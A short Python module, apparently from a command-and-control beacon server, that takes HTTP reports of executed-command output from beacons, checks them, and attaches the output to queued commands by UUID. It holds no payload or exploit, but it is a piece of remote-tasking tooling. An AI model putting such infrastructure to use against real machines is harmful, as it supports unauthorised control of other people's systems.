import os
from http.server import BaseHTTPRequestHandler

from Modules.global_objects import command_list, logger, obfuscation_map
from Modules.beacon.beacon_server.utils import process_request_data


def handle_command_response(handler: BaseHTTPRequestHandler, match: dict):
    """
    Receives the output from executed commands.
    Args:
        handler (BaseHTTPRequestHandler): The HTTP request handler
        match (dict): Regex match object for the request path
    Returns:
        None
    """
    logger.info(f"Response received from {handler.path}")

    content_len = int(handler.headers.get('Content-Length', 0))
    raw_data = handler.rfile.read(content_len)

    data, error = process_request_data(raw_data)
    if error:
        handler.send_response(400)
        handler.end_headers()
        return

    reports = data.get('reports', [])

    if not reports or not all('command_uuid' in report and 'output' in report for report in reports):
        logger.error("Invalid report format received.")
        handler.send_response(400)
        handler.end_headers()
        return

    for report in reports:
        cid = report['command_uuid']
        output = report['output']
        command = command_list.get(cid)

        if not command:
            logger.error(f"Command with UUID {cid} not found in command list.")
            continue

        command.command_output = output
        print(f"Command output for {cid}: {output}")
        if command.command == "module":
            command.data = ""
    
    handler.send_response(200)
    handler.end_headers()
